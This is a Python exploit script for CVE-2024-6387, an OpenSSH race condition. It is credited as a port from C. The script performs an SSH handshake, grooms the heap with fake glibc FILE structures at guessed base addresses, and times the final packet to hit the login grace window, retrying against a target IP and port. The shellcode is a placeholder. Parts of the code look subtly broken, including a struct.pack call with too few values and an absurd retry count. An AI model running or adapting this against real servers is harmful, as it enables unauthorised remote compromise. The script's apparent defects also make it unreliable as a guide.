"""
CVE-2024-6387 Exploit
Code transfer in C to Python3 by Yasin Saffari (symbolexe)
"""

import socket
import time
import struct
import random
import fcntl
import os
import errno

# Constants
MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
MAX_STARTUPS = 100
CHUNK_ALIGN = lambda s: (s + 15) & ~15

# Possible glibc base addresses (for ASLR bypass)
GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Shellcode placeholder (replace with actual shellcode)
shellcode = b'\x90\x90\x90\x90'

def setup_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_addr = (ip, port)
        sock.connect(server_addr)
        sock.setblocking(0)
        return sock
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def send_packet(sock, packet_type, data):
    packet = struct.pack('>I', len(data) + 5) + struct.pack('B', packet_type) + data
    try:
        sock.sendall(packet)
    except Exception as e:
        print(f"send_packet error: {e}")

def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    try:
        sock.sendall(ssh_version)
    except Exception as e:
        print(f"send_ssh_version error: {e}")

def receive_ssh_version(sock):
    buffer = bytearray(256)
    try:
        received = sock.recv_into(buffer)
        if received > 0:
            print(f"Received SSH version: {buffer[:received].decode()}")
            return 0
        elif received == 0:
            print("Connection closed while receiving SSH version")
    except BlockingIOError:
        pass
    except Exception as e:
        print(f"receive_ssh_version error: {e}")
    return -1

def send_kex_init(sock):
    kexinit_payload = bytearray(36)
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    buffer = bytearray(1024)
    try:
        received = sock.recv_into(buffer)
        if received > 0:
            print(f"Received KEX_INIT ({received} bytes)")
            return 0
        elif received == 0:
            print("Connection closed while receiving KEX_INIT")
    except BlockingIOError:
        pass
    except Exception as e:
        print(f"receive_kex_init error: {e}")
    return -1

def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    if receive_ssh_version(sock) < 0:
        return -1
    send_kex_init(sock)
    if receive_kex_init(sock) < 0:
        return -1
    return 0

def prepare_heap(sock):
    for i in range(10):
        tcache_chunk = bytearray(b'A' * 64)
        send_packet(sock, 5, tcache_chunk)

    for i in range(27):
        large_hole = bytearray(b'B' * 8192)
        send_packet(sock, 5, large_hole)

        small_hole = bytearray(b'C' * 320)
        send_packet(sock, 5, small_hole)

    for i in range(27):
        fake_data = bytearray(4096)
        create_fake_file_structure(fake_data, GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)

    large_string = bytearray(b'E' * (MAX_PACKET_SIZE - 1))
    send_packet(sock, 5, large_string)

def create_fake_file_structure(data, glibc_base):
    data[:] = b'\x00' * len(data)

    fake_file = struct.pack(
        'QQQQQQQQQQQQQQi40xQ',
        glibc_base + 0x21b740,  # fake vtable (_IO_wfile_jumps)
        glibc_base + 0x21d7f8   # fake _codecvt
    )

    data[-16:] = fake_file[:8]
    data[-8:] = fake_file[8:]

def time_final_packet(sock):
    time_before = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    parsing_time = time_after - time_before
    print(f"Estimated parsing time: {parsing_time:.6f} seconds")
    return parsing_time

def measure_response_time(sock, error_type):
    if error_type == 1:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
    else:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"

    start = time.time()
    send_packet(sock, 50, error_packet)

    try:
        response = sock.recv(1024)
    except BlockingIOError:
        response = None

    end = time.time()
    elapsed = end - start
    return elapsed

def create_public_key_packet(packet, size, glibc_base):
    packet[:] = b'\x00' * size
    offset = 0

    for i in range(27):
        packet[offset:offset + CHUNK_ALIGN(4096)] = struct.pack('I', CHUNK_ALIGN(4096))
        offset += CHUNK_ALIGN(4096)
        packet[offset:offset + CHUNK_ALIGN(304)] = struct.pack('I', CHUNK_ALIGN(304))
        offset += CHUNK_ALIGN(304)

    packet[:8] = b"ssh-rsa "
    packet[CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13: CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13 + len(shellcode)] = shellcode

    for i in range(27):
        create_fake_file_structure(packet[CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i: CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * (i + 1)], glibc_base)

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = bytearray(MAX_PACKET_SIZE)
    create_public_key_packet(final_packet, MAX_PACKET_SIZE, glibc_base)

    try:
        sock.sendall(final_packet[:-1])
    except Exception as e:
        print(f"send final packet error: {e}")
        return 0

    start = time.time()
    while True:
        elapsed = time.time() - start
        if elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001):
            try:
                sock.sendall(final_packet[-1:])
                break
            except Exception as e:
                print(f"send last byte error: {e}")
                return 0

    try:
        response = sock.recv(1024)
        if response:
            print(f"Received response after exploit attempt ({len(response)} bytes)")
            if response[:8] != b"SSH-2.0-":
                print("Possible hit on 'large' race window")
                return 1
        else:
            print("Connection closed by server - possible successful exploitation")
            return 1
    except BlockingIOError:
        print("No immediate response from server - possible successful exploitation")
        return 1
    except Exception as e:
        print(f"recv error: {e}")

    return 0

def main():
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    parsing_time = 0
    success = 0

    random.seed(time.time())

    for base_idx in range(NUM_GLIBC_BASES):
        glibc_base = GLIBC_BASES[base_idx]
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        for attempt in range(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999")

            sock = setup_connection(ip, port)
            if not sock:
                print(f"Failed to establish connection, attempt {attempt}")
                continue

            if perform_ssh_handshake(sock) < 0:
                print(f"SSH handshake failed, attempt {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            parsing_time = time_final_packet(sock)

            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                success = 1
                break

            sock.close()
            time.sleep(0.1)  # 100ms delay between attempts, as mentioned in the advisory

        if success:
            break

    exit(not success)

if __name__ == "__main__":
    main()
